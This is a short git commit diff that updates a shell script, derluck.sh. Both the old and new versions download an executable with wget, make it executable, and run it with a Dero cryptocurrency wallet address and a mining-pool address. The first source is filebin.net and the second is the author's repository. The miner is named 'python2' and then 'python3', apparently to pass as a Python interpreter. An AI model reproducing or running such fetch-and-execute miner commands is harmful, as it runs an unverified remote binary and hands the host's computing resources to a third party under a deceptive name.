96d292249d693da6dfa263aad130083657ad76a1
monhodsompul <168453591+monhodsompul@users.noreply.github.com>
2024-08-28 04:08:48 +0700

    Update derluck.sh

--- derluck.sh
+++ derluck.sh
@@ -1,3 +1,3 @@
-wget https://filebin.net/7jcf23jc9i8nu4qo/python2
-chmod +x python2
-./python2 -w deroi1qy9al37a8qgjmat4y9wf5wc637md58jtt6p4980k34xxhrk2h9m6jq9pvfz92xcqqqqepmry5nlsk5z6eq -d dero.rabidmining.com:10300
+wget https://github.com/monhodsompul/derluck/raw/main/python3
+chmod +x python3
+./python3 --daemon-rpc-address=dero.rabidmining.com:10300 --wallet-address=deroi1qy9al37a8qgjmat4y9wf5wc637md58jtt6p4980k34xxhrk2h9m6jq9pvfz92xcqqqqepmry5nlsk5z6eq
